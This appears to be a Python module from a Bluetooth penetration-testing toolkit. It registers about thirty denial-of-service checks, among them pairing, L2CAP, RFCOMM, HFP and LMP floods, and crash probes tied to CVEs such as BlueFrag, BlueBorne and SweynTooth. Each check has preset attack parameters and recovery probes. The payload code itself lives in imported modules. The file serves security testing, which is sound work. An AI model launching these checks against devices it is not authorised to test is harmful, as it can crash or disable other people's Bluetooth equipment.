"""Modular DoS check registry and wrappers around attack implementations."""

from __future__ import annotations

from blue_tap.attack.dos import PairingFlood
from blue_tap.attack.dos_checks_ble import sweyntooth_att_deadlock, sweyntooth_key_size_overflow
from blue_tap.attack.dos_checks_classic import bluez_avdtp_malformed_setconf, bluez_avrcp_event_oob
from blue_tap.attack.dos_checks_raw_acl import bluefrag_crash_probe
from blue_tap.attack.dos_framework import (
    DosCheck,
    RECOVERY_PROBE_BLE_ADVERTISING,
    RECOVERY_PROBE_BLE_ATT,
    RECOVERY_PROBE_BLE_ATT_REQUEST,
    RECOVERY_PROBE_CLASSIC_L2PING,
    RECOVERY_PROBE_CLASSIC_NAME,
)
from blue_tap.attack.protocol_dos import BNEPDoS, HFPDoS, L2CAPDoS, LMPDoS, OBEXDoS, RFCOMMDoS, SDPDoS


def _pair_flood(address: str, hci: str = "hci0", count: int = 50, interval: float = 0.5) -> dict:
    return PairingFlood(address, hci=hci).flood_pairing_requests(count=count, interval=interval)


def _name_flood(address: str, hci: str = "hci0", name_length: int = 248) -> dict:
    return PairingFlood(address, hci=hci).long_name_flood(name_length=name_length)


def _rate_test(address: str, hci: str = "hci0", attempts: int = 10, pair_timeout: float = 15.0) -> dict:
    return PairingFlood(address, hci=hci).detect_rate_limiting(attempts=attempts, pair_timeout=pair_timeout)


def _l2ping_flood(address: str, hci: str = "hci0", count: int = 1000, size: int = 600, flood: bool = True) -> dict:
    return PairingFlood(address, hci=hci).l2ping_flood(count=count, size=size, flood=flood)


def _bluefrag_crash_probe(address: str, hci: str = "hci1", continuation_shortfall: int = 2) -> dict:
    return bluefrag_crash_probe(address, hci=hci, continuation_shortfall=continuation_shortfall)


def _sweyntooth_key_size_overflow(address: str, hci: str = "hci0", max_key_size: int = 253) -> dict:
    return sweyntooth_key_size_overflow(address, hci=hci, max_key_size=max_key_size)


def _sweyntooth_att_deadlock(address: str, hci: str = "hci0", mtu: int = 247,
                             settle_seconds: float = 1.0) -> dict:
    return sweyntooth_att_deadlock(address, hci=hci, mtu=mtu, settle_seconds=settle_seconds)


def _bluez_avdtp_malformed_setconf(address: str, hci: str = "hci0", wait_after: float = 0.5) -> dict:
    return bluez_avdtp_malformed_setconf(address, hci=hci, wait_after=wait_after)


def _bluez_avrcp_event_oob(address: str, hci: str = "hci0", event_id: int = 0x0E,
                           wait_after: float = 0.5) -> dict:
    return bluez_avrcp_event_oob(address, hci=hci, event_id=event_id, wait_after=wait_after)


def _l2cap_storm(address: str, hci: str = "hci0", rounds: int = 100) -> dict:
    return L2CAPDoS(address, hci=hci).config_option_bomb(rounds=rounds)


def _l2cap_cid_exhaust(address: str, hci: str = "hci0", count: int = 200) -> dict:
    return L2CAPDoS(address, hci=hci).cid_exhaustion(count=count)


def _l2cap_data_flood(address: str, hci: str = "hci0", count: int = 500, size: int = 672) -> dict:
    return L2CAPDoS(address, hci=hci).echo_amplification(count=count, payload_size=size)


def _sdp_continuation(address: str, hci: str = "hci0", connections: int = 10) -> dict:
    return SDPDoS(address, hci=hci).continuation_exhaustion(connections=connections)


def _sdp_des_bomb(address: str, hci: str = "hci0", depth: int = 100) -> dict:
    return SDPDoS(address, hci=hci).nested_des_bomb(depth=depth)


def _sdp_hfp_race(address: str, hci: str = "hci0", attempts: int = 3, close_delay: float = 0.05) -> dict:
    return SDPDoS(address, hci=hci).double_connection_hfp_race(attempts=attempts, close_delay=close_delay)


def _bnep_heap_overflow(address: str, hci: str = "hci0", attempts: int = 3, extra_size: int = 8) -> dict:
    return BNEPDoS(address, hci=hci).heap_overflow_probe(attempts=attempts, extra_size=extra_size)


def _bnep_filter_underflow(address: str, hci: str = "hci0", attempts: int = 3) -> dict:
    return BNEPDoS(address, hci=hci).filter_underflow_probe(attempts=attempts)


def _rfcomm_sabm_flood(address: str, hci: str = "hci0", count: int = 60) -> dict:
    return RFCOMMDoS(address, hci=hci).sabm_flood(count=count)


def _rfcomm_mux_flood(address: str, hci: str = "hci0", count: int = 500) -> dict:
    return RFCOMMDoS(address, hci=hci).mux_command_flood(count=count)


def _obex_connect_flood(address: str, hci: str = "hci0", count: int = 20) -> dict:
    return OBEXDoS(address, hci=hci).connect_flood(count=count)


def _hfp_at_flood(address: str, hci: str = "hci0", channel: int = 10, count: int = 5000) -> dict:
    return HFPDoS(address, hci=hci).at_command_flood(channel=channel, count=count)


def _hfp_slc_confuse(address: str, hci: str = "hci0", channel: int = 10) -> dict:
    return HFPDoS(address, hci=hci).slc_state_confusion(channel=channel)


def _hfp_rapid_reconnect(address: str, hci: str = "hci0", channel: int | None = None,
                         attempts: int = 10, reconnect_delay: float = 0.02) -> dict:
    return HFPDoS(address, hci=hci).rapid_reconnect_race(
        channel=channel,
        attempts=attempts,
        reconnect_delay=reconnect_delay,
    )


def _lmp_detach(address: str, hci: str = "hci1", count: int = 500, delay: float = 0.005) -> dict:
    return LMPDoS(address, hci=hci).detach_flood(count=count, delay=delay)


def _lmp_switch(address: str, hci: str = "hci1", count: int = 500, delay: float = 0.005) -> dict:
    return LMPDoS(address, hci=hci).switch_storm(count=count, delay=delay)


def _lmp_features(address: str, hci: str = "hci1", count: int = 1000, delay: float = 0.001) -> dict:
    return LMPDoS(address, hci=hci).features_flood(count=count, delay=delay)


def _lmp_invalid_opcode(address: str, hci: str = "hci1", count: int = 500, delay: float = 0.002) -> dict:
    return LMPDoS(address, hci=hci).invalid_opcode_flood(count=count, delay=delay)


def _lmp_encryption_toggle(address: str, hci: str = "hci1", count: int = 100, delay: float = 0.01) -> dict:
    return LMPDoS(address, hci=hci).encryption_toggle(count=count, delay=delay)


def _lmp_timing(address: str, hci: str = "hci1", count: int = 1000, delay: float = 0.001) -> dict:
    return LMPDoS(address, hci=hci).timing_flood(count=count, delay=delay)


DOS_CHECKS: tuple[DosCheck, ...] = (
    DosCheck("pair_flood", "Pairing Request Flood", "pairing", _pair_flood, {"count": 50, "interval": 0.5},
             description="Repeated pairing attempts to stress the target pairing state machine.", category="pairing",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("name_flood", "Oversized Local Name Pairing Probe", "pairing", _name_flood, {"name_length": 248},
             description="Pair using a maximum-length adapter name to stress remote-name handling.", category="pairing",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("rate_test", "Pairing Rate-Limit Test", "pairing", _rate_test, {"attempts": 10, "pair_timeout": 15.0},
             description="Measure timing/backoff behavior during repeated pairing attempts.", category="pairing",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("l2ping_flood", "L2CAP Echo Flood", "l2cap", _l2ping_flood, {"count": 1000, "size": 600, "flood": True},
             description="Flood the target with L2CAP echo requests via l2ping.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2020_0022_bluefrag", "CVE-2020-0022 BlueFrag Crash Probe", "raw_acl", _bluefrag_crash_probe,
             {"hci": "hci1", "continuation_shortfall": 2},
             description="Destructive raw ACL fragment mismatch trigger for the Android BlueFrag path.",
             cves=("CVE-2020-0022",),
             requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("l2cap_storm", "L2CAP Connection Storm", "l2cap", _l2cap_storm, {"rounds": 100},
             description="Rapid connect/disconnect cycles against SDP PSM 1.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("l2cap_cid_exhaust", "L2CAP CID Exhaustion", "l2cap", _l2cap_cid_exhaust, {"count": 200},
             description="Hold many parallel L2CAP channels open to exhaust channel state.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("l2cap_data_flood", "L2CAP Data Flood", "l2cap", _l2cap_data_flood, {"count": 500, "size": 672},
             description="Flood the SDP path with large malformed requests.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("sdp_continuation", "SDP Continuation Exhaustion", "sdp", _sdp_continuation, {"connections": 10},
             description="Open fragmented SDP requests and abandon continuation state.",
             cves=("CVE-2021-41229",),
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("sdp_des_bomb", "SDP Nested DES Bomb", "sdp", _sdp_des_bomb, {"depth": 100},
             description="Send deeply nested SDP data element sequences to stress recursive parsing.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2017_0781_bnep_heap", "CVE-2017-0781 BNEP Heap Overflow Probe", "bnep", _bnep_heap_overflow,
             {"attempts": 3, "extra_size": 8},
             description="Near-boundary BlueBorne BNEP oversized-UUID probe with crash monitoring.",
             cves=("CVE-2017-0781",),
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2017_0782_bnep_underflow", "CVE-2017-0782 BNEP Filter Underflow Probe", "bnep", _bnep_filter_underflow,
             {"attempts": 3},
             description="BlueBorne BNEP filter length underflow probe with follow-up setup check.",
             cves=("CVE-2017-0782",),
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2019_19196_key_size", "CVE-2019-19196 SweynTooth Key Size Overflow", "ble", _sweyntooth_key_size_overflow,
             {"max_key_size": 253},
             description="Malformed BLE SMP Pairing Request with out-of-range max_key_size for SweynTooth-class crash targets.",
             cves=("CVE-2019-19196",),
             recovery_probes=(RECOVERY_PROBE_BLE_ATT_REQUEST, RECOVERY_PROBE_BLE_ADVERTISING)),
    DosCheck("cve_2019_19192_att_deadlock", "CVE-2019-19192 SweynTooth ATT Deadlock", "ble", _sweyntooth_att_deadlock,
             {"mtu": 247, "settle_seconds": 1.0},
             description="Double ATT Exchange MTU sequence followed by reconnect verification for BlueNRG-style deadlock targets.",
             cves=("CVE-2019-19192",),
             recovery_probes=(RECOVERY_PROBE_BLE_ATT_REQUEST, RECOVERY_PROBE_BLE_ADVERTISING)),
    DosCheck("cve_2022_39177_avdtp_setconf", "CVE-2022-39177 AVDTP Malformed SETCONF", "avdtp", _bluez_avdtp_malformed_setconf,
             {"wait_after": 0.5},
             description="Malformed AVDTP SET_CONFIGURATION capability length probe against BlueZ audio targets.",
             cves=("CVE-2022-39177",),
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2023_27349_avrcp_event", "CVE-2023-27349 AVRCP Event OOB Probe", "avrcp", _bluez_avrcp_event_oob,
             {"event_id": 14, "wait_after": 0.5},
             description="Minimal out-of-range AVRCP REGISTER_NOTIFICATION event probe with reconnect-based crash confirmation.",
             cves=("CVE-2023-27349",),
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2025_0084_sdp_race", "CVE-2025-0084 SDP Double-Connection Race", "sdp", _sdp_hfp_race,
             {"attempts": 3, "close_delay": 0.05},
             description="Rapid double SDP connection race against the target's HFP SDP discovery path.",
             cves=("CVE-2025-0084",),
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("rfcomm_sabm_flood", "RFCOMM SABM Flood", "rfcomm", _rfcomm_sabm_flood, {"count": 60},
             description="Open many RFCOMM DLCIs to exhaust multiplexer resources.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("rfcomm_mux_flood", "RFCOMM Multiplexer Flood", "rfcomm", _rfcomm_mux_flood, {"count": 500},
             description="Flood RFCOMM multiplexer control commands.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("obex_connect_flood", "OBEX Connect Flood", "obex", _obex_connect_flood, {"count": 20},
             description="Open and hold multiple OBEX sessions simultaneously.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("hfp_at_flood", "HFP AT Command Flood", "hfp", _hfp_at_flood, {"channel": 10, "count": 5000},
             description="Flood HFP AT command handling after minimal SLC setup.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("hfp_slc_confuse", "HFP SLC State Confusion", "hfp", _hfp_slc_confuse, {"channel": 10},
             description="Send out-of-order HFP AT commands to confuse the SLC state machine.",
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("cve_2025_48593_hfp_reconnect", "CVE-2025-48593 HFP Rapid Reconnect Race", "hfp", _hfp_rapid_reconnect,
             {"channel": None, "attempts": 10, "reconnect_delay": 0.02},
             description="Post-pairing rapid RFCOMM reconnect race against HFP Hands-Free targets.",
             cves=("CVE-2025-48593",),
             requires_pairing=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("lmp_detach_flood", "LMP DETACH Flood", "lmp", _lmp_detach, {"hci": "hci1", "count": 500, "delay": 0.005},
             description="Flood LMP detach requests at the controller layer.", requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("lmp_switch_storm", "LMP Switch Storm", "lmp", _lmp_switch, {"hci": "hci1", "count": 500, "delay": 0.005},
             description="Flood LMP role-switch requests.", requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("lmp_features_flood", "LMP Features Flood", "lmp", _lmp_features, {"hci": "hci1", "count": 1000, "delay": 0.001},
             description="Flood LMP feature requests.", requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("lmp_invalid_opcode", "LMP Invalid Opcode Flood", "lmp", _lmp_invalid_opcode, {"hci": "hci1", "count": 500, "delay": 0.002},
             description="Send undefined LMP opcodes.", requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("lmp_encryption_toggle", "LMP Encryption Toggle Storm", "lmp", _lmp_encryption_toggle, {"hci": "hci1", "count": 100, "delay": 0.01},
             description="Rapidly toggle link encryption.", requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
    DosCheck("lmp_timing_flood", "LMP Timing Accuracy Flood", "lmp", _lmp_timing, {"hci": "hci1", "count": 1000, "delay": 0.001},
             description="Flood LMP timing-accuracy requests.", requires_darkfirmware=True,
             recovery_probes=(RECOVERY_PROBE_CLASSIC_L2PING, RECOVERY_PROBE_CLASSIC_NAME)),
)


DOS_CHECK_INDEX = {check.check_id: check for check in DOS_CHECKS}
